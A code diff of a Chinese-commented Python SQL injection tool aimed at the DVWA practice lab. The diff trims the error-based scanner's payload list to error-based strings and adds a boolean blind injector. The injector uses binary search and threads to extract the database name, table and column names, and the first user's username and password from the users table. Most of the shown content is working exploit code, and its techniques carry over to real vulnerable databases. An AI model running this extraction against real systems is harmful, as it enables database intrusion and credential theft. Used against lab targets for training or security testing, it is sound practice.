@@ -4,12 +4,12 @@ import requests
 import urllib.parse
 import time
 import json
-import difflib
 import re
 import urllib3
 from typing import Dict, List, Tuple, Optional, Any
 from colorama import Fore, init
-from datetime import datetime  # 添加这行导入
+from datetime import datetime
+from concurrent.futures import ThreadPoolExecutor, as_completed
 
 # ========== 配置相对路径 ==========
 CURRENT_DIR = os.path.dirname(os.path.abspath(__file__))
@@ -17,6 +17,7 @@ CURRENT_DIR = os.path.dirname(os.path.abspath(__file__))
 
 try:
     from DVWAlogin import DvwaLogin
+
     print(f"{Fore.GREEN}[INFO] 成功导入DVWA登录模块")
 except ImportError as e:
     print(f"{Fore.RED}[ERROR] 无法导入DVWA登录模块: {e}")
@@ -29,7 +30,7 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 
 class IntegratedSQLScanner:
-    """SQL注入扫描器 """
+    """SQL注入扫描器（仅错误注入）"""
 
     def __init__(self, timeout: int = 10):
         self.timeout = timeout
@@ -45,34 +46,17 @@ class IntegratedSQLScanner:
             'injection_points_found': 0
         }
 
-        # SQL注入payload库
+        # SQL注入payload库（仅保留错误注入）
         self.payloads = {
             'error_based': [
                 "'", "''", "`", "\\'", "\"", "\\\"", ";",
                 "' OR '1'='1", "' OR 1=1--", "') OR ('1'='1",
                 "' OR '1'='1'--", "' OR 'a'='a", "' OR 1=1#",
                 "' OR 1=1-- -", "' OR 1=1/*"
-            ],
-            'boolean_true': [
-                "' AND '1'='1", "' AND 1=1--", "') AND ('1'='1",
-                "' OR '1'='1'--", "' AND 1=1#"
-            ],
-            'boolean_false': [
-                "' AND '1'='2", "' AND 1=2--", "') AND ('1'='2",
-                "' OR '1'='2'--", "' AND 1=2#"
-            ],
-            'union_based': [
-                "' UNION SELECT 1--",
-                "' UNION SELECT 1,2--",
-                "' UNION SELECT 1,2,3--",
-                "' UNION ALL SELECT 1--",
-                "' UNION SELECT NULL--",
-                "' UNION SELECT 1,2,3,4--",
-                "' UNION SELECT 1,2,3,4,5--"
             ]
         }
 
-        # 数据库指纹特征（正则表达式，用于更精确匹配）
+        # 数据库指纹特征（正则表达式）
         self.db_fingerprints = {
             'mysql': [
                 r'you have an error in your sql syntax',
@@ -149,19 +133,19 @@ class IntegratedSQLScanner:
                     if re.search(pattern, response_text, flags=re.IGNORECASE):
                         return db_type
                 except re.error:
-                    # 在极少数情况下，pattern 可能不是合法正则，退回到简单包含判断
+                    # 正则编译失败，退回到简单包含判断
                     if pattern.lower() in response_text.lower():
                         return db_type
         return 'unknown'
 
     def discover_injection_points(self, target_url: str) -> List[Dict[str, Any]]:
-        """发现SQL注入点 - Error-based 检测（多条件验证以减少误判）"""
+        """发现SQL注入点 - Error-based 检测"""
         print(f"{Fore.CYAN}[INFO] 开始发现注入点...")
 
         injection_points = []
         parsed_params = self.parse_parameters(target_url)
 
-        # 过滤掉像 Submit 这类按钮参数
+        # 过滤掉按钮类参数
         ignore_params = {'submit', 'btn', 'button', 'action'}
         testable_params = {k: v for k, v in parsed_params.items()
                            if k.lower() not in ignore_params}
@@ -209,115 +193,10 @@ class IntegratedSQLScanner:
                     }
                     injection_points.append(injection_point)
                     print(f"{Fore.GREEN}[FOUND] {param_name} -> {db_type} (payload: {payload})")
-                    # 保留继续测试的能力，不立刻break，以便发现更多error payloads
 
         self.results['parameters_tested'] = len(testable_params)
         self.results['injection_points_found'] = len(injection_points)
         return injection_points
-
-    def check_boolean_difference(self, original: str, true_resp: str, false_resp: str) -> bool:
-        """智能布尔盲注检测 """
-        if not true_resp or not false_resp:
-            return False
-
-        # 相似度计算
-        def similarity(a, b):
-            return difflib.SequenceMatcher(None, a, b).ratio()
-
-        true_sim = similarity(original, true_resp)
-        false_sim = similarity(original, false_resp)
-
-        # 计算长度差异百分比
-        def len_diff_percent(text1, text2):
-            return abs(len(text1) - len(text2)) / max(len(text1), 1) * 100
-
-        # 多条件综合判断
-        conditions = [
-            len_diff_percent(true_resp, false_resp) > 10,  # 长度差异 > 10%
-            abs(true_sim - false_sim) > 0.15,              # 相似度差超过阈值
-            true_sim > 0.7 and false_sim > 0.7,            # 都是“有效”页面（非完全错误页面）
-            "error" not in true_resp.lower() and "error" not in false_resp.lower()  # 无明显错误提示
-        ]
-
-        return sum(conditions) >= 3  # 至少满足3个条件认为存在布尔盲注
-
-    def boolean_blind_injection(self, param_name: str, original_params: Dict, target_url: str) -> Dict[str, Any]:
-        """执行布尔盲注检测（基于原始响应 + 真/假对比）"""
-        print(f"{Fore.CYAN}[BLIND] 开始布尔盲注测试: {param_name}")
-
-        # 获取基准响应（原始参数）
-        success, original_resp = self.send_request(
-            target_url.split('?')[0],
-            params=original_params
-        )
-
-        if not success or original_resp is None or original_resp.status_code != 200:
-            return {'vulnerable': False, 'reason': '基准请求失败'}
-
-        original_text = original_resp.text
-
-        # TRUE payload
-        true_payload = f"{original_params[param_name]}' AND '1'='1"
-        true_params = {**original_params, param_name: true_payload}
-        success, true_resp = self.send_request(target_url.split('?')[0], params=true_params)
-        if not success or true_resp is None or true_resp.status_code != 200:
-            return {'vulnerable': False, 'reason': 'TRUE请求失败'}
-
-        # FALSE payload
-        false_payload = f"{original_params[param_name]}' AND '1'='2"
-        false_params = {**original_params, param_name: false_payload}
-        success, false_resp = self.send_request(target_url.split('?')[0], params=false_params)
-        if not success or false_resp is None or false_resp.status_code != 200:
-            return {'vulnerable': False, 'reason': 'FALSE请求失败'}
-
-        # 使用多条件检测
-        if self.check_boolean_difference(original_text, true_resp.text, false_resp.text):
-            return {
-                'vulnerable': True,
-                'type': 'boolean_blind',
-                'confidence': 'medium',
-                'true_payload': true_payload,
-                'false_payload': false_payload
-            }
-
-        return {'vulnerable': False}
-
-    def union_injection_test(self, param_name: str, original_params: Dict, target_url: str) -> Dict[str, Any]:
-        """Union注入测试 - 基于基准页面数字比对，尽量减少误判"""
-        print(f"{Fore.CYAN}[UNION] 开始Union注入测试: {param_name}")
-
-        # 获取原始响应作为基准
-        success, original_resp = self.send_request(target_url.split('?')[0], params=original_params)
-        if not success or original_resp is None or original_resp.status_code != 200:
-            return {'vulnerable': False}
-
-        # 提取原始页面数字（1-3位），作为基准集合
-        original_numbers = set(re.findall(r'\b\d{1,3}\b', original_resp.text))
-
-        # 逐个尝试union payload（按payload顺序代表列数）
-        for i, payload in enumerate(self.payloads['union_based'], 1):
-            test_params = {**original_params, param_name: payload}
-            success, response = self.send_request(target_url.split('?')[0], params=test_params)
-
-            if not success or response is None or response.status_code != 200:
-                continue
-
-            current_numbers = set(re.findall(r'\b\d{1,3}\b', response.text))
-            new_numbers = current_numbers - original_numbers
-
-            # 期望的数字集合（例如 1,2,3）
-            expected_numbers = {str(j) for j in range(1, i + 1)}
-            if new_numbers & expected_numbers:
-                return {
-                    'vulnerable': True,
-                    'type': 'union_based',
-                    'confidence': 'high',
-                    'columns': i,
-                    'payload': payload,
-                    'reflected_numbers': list(new_numbers)
-                }
-
-        return {'vulnerable': False}
 
     def generate_report(self) -> Dict[str, Any]:
         """生成扫描报告"""
@@ -344,12 +223,12 @@ class IntegratedSQLScanner:
         return report
 
     def scan_dvwa(self, dvwa_url: str = None):
-        """扫描DVWA的SQL注入漏洞"""
+        """扫描DVWA的SQL注入漏洞（仅错误注入）"""
         if not self.session or not self.base_url:
             print(f"{Fore.RED}[ERROR] 请先设置会话")
             return None
 
-        # 1. 目标URL准备
+        # 准备目标URL
         if not dvwa_url:
             target_url = f"{self.base_url}/vulnerabilities/sqli/?id=1&Submit=Submit"
         else:
@@ -358,57 +237,17 @@ class IntegratedSQLScanner:
         self.results['target_url'] = target_url
         print(f"{Fore.YELLOW}[START] 开始SQL注入扫描: {target_url}")
 
-        # 2. 解析参数并过滤不可测参数
+        # 解析参数并过滤
         parsed_params = self.parse_parameters(target_url)
         ignore_params = {'submit', 'btn', 'button', 'action'}
         testable_params = {k: v for k, v in parsed_params.items()
                            if k.lower() not in ignore_params}
-        single_params = {k: v[0] if v else "" for k, v in testable_params.items()}
 
         if not testable_params:
             print(f"{Fore.YELLOW}[WARNING] 未发现可测试参数")
             return self.generate_report()
 
-        # 3. 对每个参数执行深度检测（Union -> Boolean -> Error-based）
-        for param_name in single_params:
-            print(f"{Fore.CYAN}{'=' * 50}")
-            print(f"{Fore.CYAN}[*] 深度测试参数: {param_name}")
-            print(f"{Fore.CYAN}{'=' * 50}")
-
-            # 3.1 Union注入测试
-            print(f"{Fore.MAGENTA}[UNION] 测试Union注入...")
-            union_result = self.union_injection_test(param_name, single_params, target_url)
-            if union_result.get('vulnerable'):
-                self.results['vulnerabilities'].append({
-                    'parameter': param_name,
-                    'type': 'union_based',
-                    'db_type': union_result.get('db_type', 'unknown'),
-                    'confidence': union_result.get('confidence', 'high'),
-                    'payload': union_result.get('payload'),
-                    'columns': union_result.get('columns'),
-                    'reflected_numbers': union_result.get('reflected_numbers', [])
-                })
-                print(f"{Fore.GREEN}[✓] Union注入: 存在 (列数: {union_result.get('columns')})")
-            else:
-                print(f"{Fore.YELLOW}[-] Union注入: 未发现")
-
-            # 3.2 布尔盲注测试
-            print(f"{Fore.MAGENTA}[BOOL] 测试布尔盲注...")
-            bool_result = self.boolean_blind_injection(param_name, single_params, target_url)
-            if bool_result.get('vulnerable'):
-                self.results['vulnerabilities'].append({
-                    'parameter': param_name,
-                    'type': 'boolean_blind',
-                    'db_type': bool_result.get('db_type', 'unknown'),
-                    'confidence': bool_result.get('confidence', 'medium'),
-                    'true_payload': bool_result.get('true_payload'),
-                    'false_payload': bool_result.get('false_payload')
-                })
-                print(f"{Fore.GREEN}[✓] 布尔盲注: 存在")
-            else:
-                print(f"{Fore.YELLOW}[-] 布尔盲注: 未发现")
-
-        # 4. Error-based 测试（发现所有payload）
+        # 执行Error-based注入测试
         print(f"{Fore.CYAN}{'=' * 50}")
         print(f"{Fore.CYAN}[INFO] 开始Error-based注入测试...")
         print(f"{Fore.CYAN}{'=' * 50}")
@@ -425,7 +264,7 @@ class IntegratedSQLScanner:
             })
             print(f"{Fore.GREEN}[✓] Error注入: {point['payload']}")
 
-        # 5. 生成报告
+        # 生成报告
         print(f"{Fore.CYAN}{'=' * 50}")
         print(f"{Fore.GREEN}扫描完成！生成报告中...")
         return self.generate_report()
@@ -454,18 +293,7 @@ class IntegratedSQLScanner:
                 print(f"{Fore.CYAN}类型: {vuln.get('type', '未知')}")
                 print(f"{Fore.CYAN}数据库: {vuln.get('db_type', '未知')}")
                 print(f"{Fore.CYAN}置信度: {vuln.get('confidence', '未知')}")
-                print(f"{Fore.CYAN}Payload: {vuln.get('payload', vuln.get('true_payload', 'N/A'))}")
-
-                # 按类型显示额外信息
-                if vuln.get('type') == 'boolean_blind':
-                    print(f"{Fore.MAGENTA}布尔盲注 (True payload / False payload):")
-                    print(f"  True: {vuln.get('true_payload')}")
-                    print(f"  False: {vuln.get('false_payload')}")
-
-                if vuln.get('type') == 'union_based':
-                    print(f"{Fore.MAGENTA}Union注入 (columns): {vuln.get('columns')}")
-                    if vuln.get('reflected_numbers'):
-                        print(f"{Fore.MAGENTA}反射数字示例: {vuln.get('reflected_numbers')}")
+                print(f"{Fore.CYAN}Payload: {vuln.get('payload', 'N/A')}")
 
         else:
             print(f"\n{Fore.GREEN}{'✓' * 60}")
@@ -477,10 +305,326 @@ class IntegratedSQLScanner:
             print(f"  {i}. {recommendation}")
 
 
+class BlindSQLInjector:
+    """布尔盲注注入器"""
+
+    def __init__(self, session: requests.Session, base_url: str, cookie: str, timeout: int = 10):
+        self.session = session
+        self.base_url = base_url
+        self.cookie = cookie
+        self.timeout = timeout
+        self.true_indicator = "User ID exists in the database"
+        self.sleep_between_req = 0.06  # 60ms
+        self.max_db_name_len = 50
+        self.max_tables = 100
+        self.max_columns = 60
+        self.min_char = 32
+        self.max_char = 126
+
+        # 扫描结果
+        self.results = {
+            'target_url': None,
+            'scan_time': None,
+            'vulnerabilities': [],
+            'extracted_data': {}
+        }
+
+    def send_blind_request(self, payload: str) -> bool:
+        """发送盲注请求并返回结果"""
+        try:
+            target_url = f"{self.base_url}/vulnerabilities/sqli_blind/"
+            params = {'id': payload, 'Submit': 'Submit'}
+            headers = {
+                'User-Agent': 'PythonScanner/1.0',
+                'Cookie': self.cookie
+            }
+
+            response = self.session.get(
+                target_url,
+                params=params,
+                headers=headers,
+                timeout=self.timeout,
+                verify=False
+            )
+
+            # 检查响应是否包含true指示器
+            result = self.true_indicator in response.text
+            time.sleep(self.sleep_between_req)
+            return result
+
+        except Exception as e:
+            print(f"{Fore.RED}[ERROR] 盲注请求失败: {e}")
+            return False
+
+    def binary_search_length(self, expression: str, min_val: int, max_val: int) -> int:
+        """二分查找长度"""
+        low, high = min_val, max_val
+        while low <= high:
+            mid = (low + high) // 2
+            payload = f"1' AND LENGTH({expression})>{mid}#"
+            if self.send_blind_request(payload):
+                low = mid + 1
+            else:
+                high = mid - 1
+
+        candidate = low
+        if min_val <= candidate <= max_val:
+            verify_payload = f"1' AND LENGTH({expression})={candidate}#"
+            if self.send_blind_request(verify_payload):
+                return candidate
+        return -1
+
+    def binary_search_int(self, expression: str, min_val: int, max_val: int) -> int:
+        """二分查找整数值"""
+        low, high = min_val, max_val
+        while low <= high:
+            mid = (low + high) // 2
+            payload = f"1' AND ({expression})>{mid}#"
+            if self.send_blind_request(payload):
+                low = mid + 1
+            else:
+                high = mid - 1
+
+        candidate = low
+        if min_val <= candidate <= max_val:
+            verify_payload = f"1' AND ({expression})={candidate}#"
+            if self.send_blind_request(verify_payload):
+                return candidate
+        return -1
+
+    def binary_search_char(self, expression: str, position: int, min_char: int, max_char: int) -> int:
+        """二分查找字符ASCII值"""
+        low, high = min_char, max_char
+        while low <= high:
+            mid = (low + high) // 2
+            payload = f"1' AND ASCII(SUBSTR({expression},{position},1))>{mid}#"
+            if self.send_blind_request(payload):
+                low = mid + 1
+            else:
+                high = mid - 1
+
+        candidate = low
+        if min_char <= candidate <= max_char:
+            verify_payload = f"1' AND ASCII(SUBSTR({expression},{position},1))={candidate}#"
+            if self.send_blind_request(verify_payload):
+                return candidate
+        return -1
+
+    def extract_string(self, expression: str, max_len: int) -> str:
+        """提取字符串"""
+        length = self.binary_search_length(expression, 1, max_len)
+        if length <= 0:
+            return ""
+
+        result = []
+        for pos in range(1, length + 1):
+            char_code = self.binary_search_char(expression, pos, self.min_char, self.max_char)
+            if char_code > 0:
+                result.append(chr(char_code))
+            else:
+                result.append('?')
+        return ''.join(result)
+
+    def extract_table_names(self, count: int) -> List[str]:
+        """多线程提取表名"""
+        tables = []
+
+        def get_table_by_index(index: int) -> Tuple[int, str]:
+            expression = f"(SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT {index},1)"
+            name = self.extract_string(expression, 60)
+            return index, name
+
+        with ThreadPoolExecutor(max_workers=6) as executor:
+            futures = {executor.submit(get_table_by_index, i): i for i in range(count)}
+            for future in as_completed(futures):
+                try:
+                    index, name = future.result()
+                    if name:
+                        tables.append((index, name))
+                        print(f"{Fore.GREEN}[EXTRACT] 表 {index}: {name}")
+                except Exception as e:
+                    print(f"{Fore.RED}[ERROR] 获取表名失败: {e}")
+
+        tables.sort(key=lambda x: x[0])
+        return [name for _, name in tables]
+
+    def extract_column_names(self, table_name: str, count: int) -> List[str]:
+        """多线程提取列名"""
+        columns = []
+
+        def get_column_by_index(index: int) -> Tuple[int, str]:
+            expression = f"(SELECT column_name FROM information_schema.columns WHERE table_schema=DATABASE() AND table_name='{table_name}' LIMIT {index},1)"
+            name = self.extract_string(expression, 60)
+            return index, name
+
+        with ThreadPoolExecutor(max_workers=6) as executor:
+            futures = {executor.submit(get_column_by_index, i): i for i in range(count)}
+            for future in as_completed(futures):
+                try:
+                    index, name = future.result()
+                    if name:
+                        columns.append((index, name))
+                        print(f"{Fore.GREEN}[EXTRACT] 列 {index}: {name}")
+                except Exception as e:
+                    print(f"{Fore.RED}[ERROR] 获取列名失败: {e}")
+
+        columns.sort(key=lambda x: x[0])
+        return [name for _, name in columns]
+
+    def scan(self, dvwa_url: str = None) -> Dict[str, Any]:
+        """执行完整盲注扫描"""
+        if not self.session or not self.base_url:
+            print(f"{Fore.RED}[ERROR] 会话无效")
+            return None
+
+        # 准备目标URL
+        target_url = dvwa_url or f"{self.base_url}/vulnerabilities/sqli_blind/?id=1&Submit=Submit"
+        self.results['target_url'] = target_url
+
+        print(f"{Fore.YELLOW}[START] 开始布尔盲注扫描: {target_url}")
+
+        # 1. 检查注入点
+        print(f"{Fore.CYAN}[INFO] 检查注入点...")
+        test_payload = "1' OR 1=1#"
+        if not self.send_blind_request(test_payload):
+            print(f"{Fore.RED}[ERROR] 未发现有效注入点")
+            return None
+
+        print(f"{Fore.GREEN}[FOUND] 注入点存在: {test_payload}")
+
+        # 2. 添加漏洞信息
+        self.results['vulnerabilities'].append({
+            'parameter': 'id',
+            'type': 'boolean_blind',
+            'confidence': 'high',
+            'payload': test_payload
+        })
+
+        # 3. 提取数据库信息
+        print(f"{Fore.CYAN}[INFO] 提取数据库信息...")
+        db_name = self.extract_string("DATABASE()", self.max_db_name_len)
+        self.results['extracted_data']['database_name'] = db_name
+        print(f"{Fore.GREEN}[EXTRACT] 数据库名: {db_name}")
+
+        # 4. 提取表信息
+        print(f"{Fore.CYAN}[INFO] 提取表数量...")
+        table_count = self.binary_search_int(
+            "SELECT COUNT(table_name) FROM information_schema.tables WHERE table_schema=DATABASE()", 0, self.max_tables)
+        print(f"{Fore.GREEN}[EXTRACT] 表数量: {table_count}")
+
+        if table_count > 0:
+            print(f"{Fore.CYAN}[INFO] 提取表名...")
+            tables = self.extract_table_names(table_count)
+            self.results['extracted_data']['tables'] = tables
+
+            # 5. 提取users表列信息
+            if 'users' in tables:
+                print(f"{Fore.CYAN}[INFO] 提取'users'表列数量...")
+                col_count = self.binary_search_int(
+                    "SELECT COUNT(column_name) FROM information_schema.columns WHERE table_schema=DATABASE() AND table_name='users'",
+                    0, self.max_columns)
+                print(f"{Fore.GREEN}[EXTRACT] 'users'表列数量: {col_count}")
+
+                if col_count > 0:
+                    print(f"{Fore.CYAN}[INFO] 提取'users'表列名...")
+                    columns = self.extract_column_names('users', col_count)
+                    self.results['extracted_data']['users_columns'] = columns
+
+                    # 6. 尝试提取用户数据
+                    if 'user' in columns and 'password' in columns:
+                        print(f"{Fore.CYAN}[INFO] 提取第一个用户信息...")
+                        username = self.extract_string("(SELECT user FROM users LIMIT 0,1)", 60)
+                        password = self.extract_string("(SELECT password FROM users LIMIT 0,1)", 200)
+                        self.results['extracted_data']['first_user'] = {
+                            'username': username,
+                            'password': password
+                        }
+                        print(f"{Fore.GREEN}[EXTRACT] 用户名: {username}")
+                        print(f"{Fore.GREEN}[EXTRACT] 密码: {password}")
+
+        return self.generate_report()
+
+    def generate_report(self) -> Dict[str, Any]:
+        """生成盲注扫描报告"""
+        self.results['scan_time'] = time.strftime('%Y-%m-%d %H:%M:%S')
+
+        report = {
+            'scan_summary': {
+                'target_url': self.results['target_url'],
+                'scan_time': self.results['scan_time'],
+                'vulnerability_type': 'boolean_blind',
+                'parameters_tested': 1,
+                'injection_points_found': len(self.results['vulnerabilities'])
+            },
+            'vulnerabilities': self.results['vulnerabilities'],
+            'extracted_data': self.results['extracted_data'],
+            'recommendations': [
+                "使用参数化查询或预编译语句",
+                "实施输入验证和过滤",
+                "使用Web应用防火墙(WAF)",
+                "最小权限原则配置数据库账户",
+                "定期进行安全测试和代码审计"
+            ]
+        }
+
+        return report
+
+
+def print_report(report: Dict[str, Any], scan_type: str):
+    """统一打印扫描报告"""
+    print(f"\n{Fore.YELLOW}{'=' * 60}")
+    print(f"{Fore.CYAN}SQL注入扫描报告 ({scan_type})")
+    print(f"{Fore.YELLOW}{'=' * 60}")
+
+    summary = report['scan_summary']
+    print(f"{Fore.GREEN}目标URL: {summary['target_url']}")
+    print(f"{Fore.GREEN}扫描时间: {summary['scan_time']}")
+    print(f"{Fore.GREEN}扫描类型: {scan_type}")
+
+    if scan_type == "错误注入":
+        print(f"{Fore.GREEN}测试参数: {summary['parameters_tested']}")
+        print(f"{Fore.GREEN}发现注入点: {summary['injection_points_found']}")
+
+    if report.get('vulnerabilities'):
+        print(f"\n{Fore.RED}{'!' * 60}")
+        print(f"{Fore.RED}发现SQL注入漏洞!")
+        print(f"{Fore.RED}{'!' * 60}")
+
+        for i, vuln in enumerate(report['vulnerabilities'], 1):
+            print(f"\n{Fore.YELLOW}[漏洞 #{i}]")
+            print(f"{Fore.CYAN}参数: {vuln.get('parameter', '未知')}")
+            print(f"{Fore.CYAN}类型: {vuln.get('type', '未知')}")
+            print(f"{Fore.CYAN}置信度: {vuln.get('confidence', '未知')}")
+            print(f"{Fore.CYAN}Payload: {vuln.get('payload', 'N/A')}")
+
+    else:
+        print(f"\n{Fore.GREEN}{'✓' * 60}")
+        print(f"{Fore.GREEN}未发现SQL注入漏洞")
+        print(f"{Fore.GREEN}{'✓' * 60}")
+
+    # 显示提取的数据（盲注）
+    if scan_type == "布尔盲注" and 'extracted_data' in report:
+        data = report['extracted_data']
+        print(f"\n{Fore.CYAN}提取的数据:")
+        if 'database_name' in data:
+            print(f"  {Fore.GREEN}数据库名: {data['database_name']}")
+        if 'tables' in data:
+            print(f"  {Fore.GREEN}表: {', '.join(data['tables'])}")
+        if 'users_columns' in data:
+            print(f"  {Fore.GREEN}users表列: {', '.join(data['users_columns'])}")
+        if 'first_user' in data:
+            user = data['first_user']
+            print(f"  {Fore.GREEN}第一个用户: {user.get('username', 'N/A')} / {user.get('password', 'N/A')}")
+
+    print(f"\n{Fore.CYAN}安全建议:")
+    for i, recommendation in enumerate(report['recommendations'], 1):
+        print(f"  {i}. {recommendation}")
+
+
 def main():
     """主函数"""
-    print(f"{Fore.CYAN}整合版SQL注入扫描器（已移除时间盲注）")
-    print(f"{Fore.CYAN}使用现有的DVWA登录模块")
+    print(f"{Fore.CYAN}整合版SQL注入扫描器")
+    print(f"{Fore.CYAN}支持错误注入和布尔盲注")
     print("=" * 50)
 
     dvwa_url = input("请输入DVWA的URL (例如: http://192.168.26.130:8085): ").strip()
@@ -488,37 +632,81 @@ def main():
         print(f"{Fore.RED}URL不能为空")
         return
 
-    print(f"{Fore.CYAN}[1/3] 初始化登录模块...")
+    print(f"{Fore.CYAN}[1/4] 初始化登录模块...")
     dvwa_login = DvwaLogin()
 
-    print(f"{Fore.CYAN}[2/3] 登录DVWA...")
+    print(f"{Fore.CYAN}[2/4] 登录DVWA...")
     if not dvwa_login.login(dvwa_url):
         print(f"{Fore.RED}登录失败，程序退出")
         return
 
-    # 测试连接（由 DVWAlogin 实现）
     dvwa_login.test_connection()
 
-    print(f"{Fore.CYAN}[3/3] 初始化扫描器...")
-    scanner = IntegratedSQLScanner(timeout=15)
-
-    if not scanner.setup_session(dvwa_login):
-        print(f"{Fore.RED}设置会话失败")
+    # 获取会话信息
+    session_info = dvwa_login.get_session_info()
+    if not session_info:
+        print(f"{Fore.RED}无法获取会话信息")
         return
 
-    print(f"{Fore.CYAN}开始SQL注入漏洞扫描...")
-    report = scanner.scan_dvwa()
+    # 让用户选择扫描类型
+    print("\n" + "=" * 50)
+    print(f"{Fore.CYAN}请选择扫描类型:")
+    print("1. 错误注入 (Error-based)--（快速发现漏洞）")
+    print("2. 布尔盲注 (Boolean Blind)--（深度数据提取）")
+    choice = input("请输入选项 (1 或 2): ").strip()
+
+    if choice == '1':
+        scan_type = "错误注入"
+        print(f"{Fore.CYAN}[3/4] 初始化错误注入扫描器...")
+        scanner = IntegratedSQLScanner(timeout=15)
+
+        if not scanner.setup_session(dvwa_login):
+            print(f"{Fore.RED}设置会话失败")
+            return
+
+        print(f"{Fore.CYAN}[4/4] 开始错误注入扫描...")
+        report = scanner.scan_dvwa()
+
+    elif choice == '2':
+        scan_type = "布尔盲注"
+        print(f"{Fore.CYAN}[3/4] 初始化盲注扫描器...")
+
+        # 构建cookie字符串
+        session_cookies = session_info['session'].cookies
+        cookie_parts = []
+        for name, value in session_cookies.items():
+            cookie_parts.append(f"{name}={value}")
+
+        # 从DVWAlogin获取安全等级cookie
+        security_cookie = getattr(dvwa_login, 'security_cookie', 'security=low')
+        if 'security=' not in security_cookie:
+            security_cookie = 'security=low'
+
+        full_cookie = f"{'; '.join(cookie_parts)}; {security_cookie}"
+
+        injector = BlindSQLInjector(
+            session=session_info['session'],
+            base_url=session_info['base_url'],
+            cookie=full_cookie,
+            timeout=15
+        )
+
+        print(f"{Fore.CYAN}[4/4] 开始布尔盲注扫描...")
+        report = injector.scan()
+
+    else:
+        print(f"{Fore.RED}无效选项")
+        return
 
     if report:
-        scanner.print_report(report)
+        print_report(report, scan_type)
 
         # 保存报告到相对路径
         report_dir = os.path.join(CURRENT_DIR, 'scan_result', 'sql_scanner')
-        os.makedirs(report_dir, exist_ok=True)  # 自动创建目录（如果不存在）
+        os.makedirs(report_dir, exist_ok=True)
 
-        # 修改：使用可读的时间格式生成文件名
         timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
-        filename = f"dvwa_sql_scan_report_{timestamp}.json"
+        filename = f"dvwa_{'error' if choice == '1' else 'blind'}_scan_report_{timestamp}.json"
         filepath = os.path.join(report_dir, filename)
 
         with open(filepath, 'w', encoding='utf-8') as f:
